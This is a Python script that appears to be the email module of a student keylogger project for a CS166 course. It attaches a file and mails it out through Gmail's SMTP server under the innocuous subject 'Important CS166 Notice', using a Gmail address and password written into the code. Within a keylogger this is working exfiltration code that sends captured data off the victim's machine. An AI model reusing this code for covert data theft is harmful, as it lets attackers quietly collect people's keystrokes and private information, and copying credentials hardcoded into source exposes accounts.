#Libraries for the email feature
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

email_information = "fake_email.txt"

file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
extension = "\\"

email_address = "testingproject085@gmail.com"       # Disposable Email
password = "testingproject"                         # Disposable Email Password
email_recipient = "testingproject085@gmail.com"

# Function to send fake email
def send_email(filename, attachment, email_recipient):
    from_address = email_address

    # Sets up the email template
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = email_recipient
    msg['Subject'] = "Important CS166 Notice"
    body = 'Please see the attachment'

    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, email_recipient, text)
    s.quit()

send_email(email_information, file_path + extension + email_information, email_recipient)